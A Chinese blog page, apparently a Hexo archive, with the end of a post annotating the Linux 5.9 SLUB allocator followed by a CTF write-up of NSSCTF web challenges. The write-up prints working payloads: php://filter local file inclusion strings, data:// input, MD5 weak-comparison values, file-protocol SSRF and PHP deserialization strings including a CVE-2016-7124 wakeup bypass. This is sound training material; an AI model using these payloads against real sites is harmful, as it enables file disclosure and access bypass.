<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /mm/slub.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *__slab_alloc(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node,</span><br><span class="line">			  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, struct kmem_cache_cpu *c)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span> *p;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">	local_irq_save(flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PREEMPTION</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We may have been preempted and rescheduled on a different</span></span><br><span class="line"><span class="comment">	 * cpu before disabling interrupts. Need to reload cpu area</span></span><br><span class="line"><span class="comment">	 * pointer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	c = this_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	p = ___slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">	local_irq_restore(flags);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>如下，当<code>cpu_slab-&gt;freelist</code>被分配完毕之后，<code>cpu_slab-&gt;page</code>也被清空<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519192842119.png" alt="image-20220519192842119"></p>

        <h2 id="2-partial分配"   >
          <a href="#2-partial分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-partial分配" class="headerlink" title="2.partial分配"></a>2.<code>partial</code>分配</h2>
      <p>在定义配置时，需要<code>CONFIG_SLUB_CPU_PARTIAL=y</code>才会有</p>
<p>进入<code>___slab_alloc()</code>函数后，会分为不少情况</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *___slab_alloc(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node,</span><br><span class="line">			  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, struct kmem_cache_cpu *c)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span> *freelist;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="comment">//这个c即为对应kmalloc-xx下的cpu_slab</span></span><br><span class="line">    <span class="comment">//检查page是否为NULL,如果为NULL代表本地缓冲池的freelist已经分配完毕</span></span><br><span class="line">    <span class="comment">//那么就会进入到new_slab</span></span><br><span class="line">	page = c-&gt;page;</span><br><span class="line">	<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * if the node is not online or has no normal memory, just</span></span><br><span class="line"><span class="comment">		 * ignore the node constraint</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">			     !node_state(node, N_NORMAL_MEMORY)))</span><br><span class="line">			node = NUMA_NO_NODE;</span><br><span class="line">		<span class="keyword">goto</span> new_slab;</span><br><span class="line">	&#125;</span><br><span class="line">redo:</span><br><span class="line">    <span class="comment">//这里有一些匹配检查,会检查page的nid和node是否能对上</span></span><br><span class="line">    <span class="comment">//不能对上就不会进行相关分配,接着重来,不太懂</span></span><br><span class="line">    <span class="comment">//也常常碰上不匹配的partial</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!node_match(page, node))) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * same as above but node_match() being false already</span></span><br><span class="line"><span class="comment">		 * implies node != NUMA_NO_NODE</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!node_state(node, N_NORMAL_MEMORY)) &#123;</span><br><span class="line">			node = NUMA_NO_NODE;</span><br><span class="line">			<span class="keyword">goto</span> redo;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			stat(s, ALLOC_NODE_MISMATCH);</span><br><span class="line">			deactivate_slab(s, page, c-&gt;freelist, c);</span><br><span class="line">			<span class="keyword">goto</span> new_slab;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* must check again c-&gt;freelist in case of cpu migration or IRQ */</span></span><br><span class="line">	freelist = c-&gt;freelist;</span><br><span class="line">	<span class="keyword">if</span> (freelist)</span><br><span class="line">		<span class="keyword">goto</span> load_freelist;</span><br><span class="line">    </span><br><span class="line">	freelist = get_freelist(s, page);</span><br><span class="line">	<span class="keyword">if</span> (!freelist) &#123;</span><br><span class="line">		c-&gt;page = <span class="literal">NULL</span>;</span><br><span class="line">		stat(s, DEACTIVATE_BYPASS);</span><br><span class="line">		<span class="keyword">goto</span> new_slab;</span><br><span class="line">	&#125;</span><br><span class="line">	stat(s, ALLOC_REFILL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//本地CPU的page被赋值之后,加载freelist的过程</span></span><br><span class="line">load_freelist:</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * freelist is pointing to the list of objects to be used.</span></span><br><span class="line"><span class="comment">	 * page is pointing to the page from which the objects are obtained.</span></span><br><span class="line"><span class="comment">	 * That page must be frozen for per cpu allocations to work.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	VM_BUG_ON(!c-&gt;page-&gt;frozen);</span><br><span class="line">	c-&gt;freelist = get_freepointer(s, freelist);</span><br><span class="line">	c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">	<span class="keyword">return</span> freelist;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里完成本地CPU的partial寻找以及重新从buddy伙伴中分配slab描述符</span></span><br><span class="line">new_slab:</span><br><span class="line">    <span class="comment">//检查本地CPU的partial是否存在</span></span><br><span class="line">	<span class="keyword">if</span> (slub_percpu_partial(c)) &#123;</span><br><span class="line">        <span class="comment">//本地CPU的partial则直接赋值给本地CPU的page,进入redo加载freelist</span></span><br><span class="line">		page = c-&gt;page = slub_percpu_partial(c);</span><br><span class="line">  		<span class="comment">//对本地CPU刚赋值的page进行相关设置,包括slab_cache等之类的设置</span></span><br><span class="line">		slub_set_percpu_partial(c, page);</span><br><span class="line">		stat(s, CPU_PARTIAL_ALLOC);</span><br><span class="line">        <span class="comment">//跳转redo,依据新的page重新加载freelist</span></span><br><span class="line">		<span class="keyword">goto</span> redo;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//new_slab_objects会检查当前kmalloc-xx对应的node下</span></span><br><span class="line">    <span class="comment">//是否存在partial可供分配,没有则会从buddy伙伴系统中分配slab页框描述符</span></span><br><span class="line">	freelist = new_slab_objects(s, gfpflags, node, &amp;c);</span><br><span class="line">	<span class="comment">//后面就是一些相关的检查及加载freelist</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!freelist)) &#123;</span><br><span class="line">		slab_out_of_memory(s, gfpflags, node);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	page = c-&gt;page;</span><br><span class="line">	<span class="keyword">if</span> (likely(!kmem_cache_debug(s) &amp;&amp; pfmemalloc_match(page, gfpflags)))</span><br><span class="line">		<span class="keyword">goto</span> load_freelist;</span><br><span class="line">    <span class="comment">//............</span></span><br><span class="line">	deactivate_slab(s, page, get_freepointer(s, freelist), c);</span><br><span class="line">	<span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="1-本地CPU的partial"   >
          <a href="#1-本地CPU的partial" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-本地CPU的partial" class="headerlink" title="(1)本地CPU的partial"></a>(1)本地CPU的<code>partial</code></h3>
      <p>首先就是判断本地<code>CPU</code>，即<code>cpu_slab</code>的<code>partial</code>，其也为一个<code>page</code>页框，会与其他的页框依据<code>struct list_head lru;</code>域组成双向循环链表。</p>
<ul>
<li><p>如果存在，则将该<code>partial</code>当作一个<code>slab</code>描述页框<code>page</code>，遍历其<code>struct list_head lru;</code>域，找到合适的<code>slab</code>描述页框<code>page</code>，赋值给<code>cpu_slab-&gt;page</code>，并且该<code>partial</code>也会在<code>slub_set_percpu_partial(c, page);</code>函数中被原本的<code>partial</code>的<code>next</code>覆盖。</p>
<p>请忽略这个<code>freelist</code>上还有值，截图的时候没有分配光<code>freelist</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519210608695.png" alt="image-20220519210608695"></p>
<p>完成之后如下所示，被覆盖掉</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519211038094.png" alt="image-20220519211038094"></p>
</li>
<li><p>然后进入<code>redo</code>，依据新赋值的<code>page</code>加载<code>freelist</code>，并且保存在<code>page</code>中的<code>freelist</code>被置空，最终如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519211452815.png" alt="image-20220519211452815"></p>
</li>
</ul>

        <h3 id="2-node中的partial"   >
          <a href="#2-node中的partial" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-node中的partial" class="headerlink" title="(2)node中的partial"></a>(2)<code>node</code>中的<code>partial</code></h3>
      <p>然后进入<code>new_slab_objects</code>函数判断本<code>kmalloc-xx</code>对应的<code>node</code>中是否存在<code>partial</code>，存在则进行相关赋值后，直接返回<code>freelist</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">new_slab_objects</span><span class="params">(struct kmem_cache *s, <span class="keyword">gfp_t</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">int</span> node, struct kmem_cache_cpu **pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *freelist;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span> =</span> *pc;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//查看本kmalloc-xx对应的node中的partial是否存在</span></span><br><span class="line">    <span class="comment">//存在进行相关赋值后直接返回freelist了</span></span><br><span class="line">	freelist = get_partial(s, flags, node, c);</span><br><span class="line">	<span class="keyword">if</span> (freelist)</span><br><span class="line">		<span class="keyword">return</span> freelist;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//本kmalloc-xx对应的node中的partial不存在,从buddy伙伴系统分配</span></span><br><span class="line">	page = new_slab(s, flags, node);</span><br><span class="line">	<span class="keyword">if</span> (page) &#123;</span><br><span class="line">		c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">		<span class="keyword">if</span> (c-&gt;page)</span><br><span class="line">			flush_slab(s, c);</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * No other reference to the page yet so we can</span></span><br><span class="line"><span class="comment">		 * muck around with it freely without cmpxchg</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		freelist = page-&gt;freelist;</span><br><span class="line">		page-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">		stat(s, ALLOC_SLAB);</span><br><span class="line">		c-&gt;page = page;</span><br><span class="line">		*pc = c;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>这里有点奇怪的是，遍历对应<code>struct kmem_cache</code>的<code>kmalloc-xx</code>下的<code>node</code>时，其<code>partial</code>指向的是<code>page</code>的<code>struct list_head lru;</code>域地址，而非实际的<code>page</code>地址，所以真实的<code>page</code>地址为<code>struct list_head lru;</code>域地址减去<code>0x8</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519201826071.png" alt="image-20220519201826071"></p>
<p>之后即从该<code>page</code>中取<code>freelist</code>进行赋值给本地的<code>kmem_cache_cpu</code>下<code>cpu_slab</code>的<code>freelist</code>，即本地缓冲池。</p>

        <h2 id="3-buddy分配"   >
          <a href="#3-buddy分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-buddy分配" class="headerlink" title="3.buddy分配"></a>3.buddy分配</h2>
      <p>如上述所示，在<code>new_slab_objects()</code>中判断<code>partial</code>不存在之后，即从buddy伙伴算法中分配新的<code>slab</code>页框描述符，之后就太复杂了，后续再学把。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/03/09/NSSCTF-Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/">NSSCTF-Web安全入门刷题</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-03-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="SWPUCTF-2021-新生赛-jicao"   >
          <a href="#SWPUCTF-2021-新生赛-jicao" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[SWPUCTF 2021 新生赛]jicao"></a>[SWPUCTF 2021 新生赛]jicao</h1>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=json_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>传入两个参数即可</p>

        <h1 id="SWPUCTF-2021-新生赛-Do-you-know-http"   >
          <a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h1>
      <p>访问如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107120854983.png" alt="image-20230107120854983"></p>
<p>浏览器不对，那么首先需要修改<code>User-Agent</code>为<code>WLLM</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107120925542.png" alt="image-20230107120925542"></p>
<p>跟随重定向后跳转到<code>a.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121003165.png" alt="image-20230107121003165"></p>
<p>发现来源<code>IP</code>不对，那么需要修改<code>X-Forwarded-For</code>字段</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121230587.png" alt="image-20230107121230587"></p>
<p>跟随重定向后得到最终<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121237694.png" alt="image-20230107121237694"></p>

        <h1 id="SWPUCTF-2021-新生赛-gift-F12"   >
          <a href="#SWPUCTF-2021-新生赛-gift-F12" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_F12"></a>[SWPUCTF 2021 新生赛]gift_F12</h1>
      <p>确实如名字，<code>F12</code>在元素资源中可以找到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107145303596.png" alt="image-20230107145303596"></p>

        <h1 id="第五空间-2021-WebFTP"   >
          <a href="#第五空间-2021-WebFTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#第五空间-2021-WebFTP" class="headerlink" title="[第五空间 2021]WebFTP"></a>[第五空间 2021]WebFTP</h1>
      <p><code>dirsearch</code>扫描之后，在<code>readm.txt</code>中找到对应的超级管理员账号密码<code>admin/admin888</code></p>
<p>登录进去之后，在<code>phpinfo.php</code>中找到<code>flag</code>，或者不用登录，直接<code>/phpinfo.php</code>就能找到，应该是所谓非预期，下面看看预期解</p>
<p>同样该<code>WebFTP</code>是<code>github</code>上一个老框架，可以在<code>/Readme/mytz.php</code>中存在敏感信息泄露漏洞</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107153916700.png" alt="image-20230107153916700"></p>
<p>或者<code>seay</code>好像可以审计出来</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107154534824.png" alt="image-20230107154534824"></p>
<p>对应泄露为<code>/Readme/mytz.php?act=phpinfo</code></p>

        <h1 id="SWPUCTF-2021-新生赛-easy-md5"   >
          <a href="#SWPUCTF-2021-新生赛-easy-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_md5"></a>[SWPUCTF 2021 新生赛]easy_md5</h1>
      <p><code>md5</code>弱比较</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155030276.png" alt="image-20230107155030276"></p>
<p>使用<code>QNKCDZO</code>和<code>s214587387a</code>即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155126859.png" alt="image-20230107155126859"></p>

        <h1 id="SWPUCTF-2021-新生赛-include"   >
          <a href="#SWPUCTF-2021-新生赛-include" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h1>
      <p>提示传入<code>file</code>参数，然后得到源码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155613921.png" alt="image-20230107155613921"></p>
<p>由于最后会使用<code>include_once</code>将对应<code>file</code>包含进来，那么可以使用相关的<code>php</code>伪协议</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p><code>base64</code>解码后得到<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155718000.png" alt="image-20230107155718000"></p>

        <h1 id="SWPUCTF-2021-新生赛-PseudoProtocols"   >
          <a href="#SWPUCTF-2021-新生赛-PseudoProtocols" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="[SWPUCTF 2021 新生赛]PseudoProtocols"></a>[SWPUCTF 2021 新生赛]PseudoProtocols</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107160859666.png" alt="image-20230107160859666"></p>
<p>首先看到提示，并且<code>URL</code>中为<code>/...?wllm=...</code>，很明显就是想让我们填一个东西，试试<code>hint.php</code>填入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107160953981.png" alt="image-20230107160953981"></p>
<p>啥也没有，那么尝试用一下<code>php</code>伪协议</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28530/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161034318.png" alt="image-20230107161034318"></p>
<p>可以看到出来了，<code>base64</code>解一下查看内容</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161117359.png" alt="image-20230107161117359"></p>
<p>让我们访问<code>/test2222222222222.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161156905.png" alt="image-20230107161156905"></p>
<p>主要关注如下，需要设置<code>a</code>，然后其内容为<code>I want flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161205486.png" alt="image-20230107161205486"></p>
<p>由于用的是<code>file_get_contents</code>函数，那么可以使用<code>data</code>数据流</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test2222222222222.php?a=data://text/plain,I%20want%20flag</span><br></pre></td></tr></table></div></figure>

<p>得到<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161327121.png" alt="image-20230107161327121"></p>

        <h1 id="NISACTF-2022-easyssrf"   >
          <a href="#NISACTF-2022-easyssrf" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h1>
      <p>访问之后提示<code>SSRF</code></p>
<p>那么访问一下本地网站下面的<code>index.php</code>，不太行，那试试<code>flag.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163522282.png" alt="image-20230107163522282"></p>
<p>再试试<code>/fl4g</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163611667.png" alt="image-20230107163611667"></p>
<p>不太行，试试<code>file</code>协议</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163829405.png" alt="image-20230107163829405"></p>
<p>访问一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163903762.png" alt="image-20230107163903762"></p>
<p>输出<code>file</code>，这里不用管那个判断，没啥用，只要<code>file</code>里面不包含<code>file</code>字符串就行，那么直接<code>/flag</code>就能得到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107164119474.png" alt="image-20230107164119474"></p>

        <h1 id="SWPUCTF-2021-新生赛-ez-unserialize"   >
          <a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize"></a>[SWPUCTF 2021 新生赛]ez_unserialize</h1>
      <p>访问啥也没有，<code>dirsearch</code>一下，发现<code>robots.txt</code>，访问一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165705357.png" alt="image-20230107165705357"></p>
<p>接着访问<code>/cl45s.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165729931.png" alt="image-20230107165729931"></p>
<p>可以看到反序列化设置一下对应属性即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28869/cl45s.php?p=O:4:%22wllm%22:2:&#123;s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:3:%22ctf%22;&#125;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165833572.png" alt="image-20230107165833572"></p>

        <h1 id="SWPUCTF-2021-新生赛-no-wakeup"   >
          <a href="#SWPUCTF-2021-新生赛-no-wakeup" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="[SWPUCTF 2021 新生赛]no_wakeup"></a>[SWPUCTF 2021 新生赛]no_wakeup</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107170206722.png" alt="image-20230107170206722"></p>
<p>尝试用<code>CVE-2016-7124</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28150/class.php?p=O:6:%22HaHaHa%22:3:&#123;s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:4:%22wllm%22;&#125;</span><br></pre></td></tr></table></div></figure>

<p>成功</p>

        <h1 id="ZJCTF-2019-NiZhuanSiWei"   >
          <a href="#ZJCTF-2019-NiZhuanSiWei" class="heading-link"><i class="fas fa-link"></i></a><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1>
      <p>写过，首先用<code>data</code>流和<code>php</code>伪协议读取<code>useless.php</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=useless.php&amp;text=data://text/plain,welcome%20to%20the%20zjctf</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107170914355.png" alt="image-20230107170914355"></p>
<p>然后借助<code>tostring</code>方法，将<code>Flag-&gt;file</code>设置为<code>flag</code>即可，通过反序化打印出来</p>
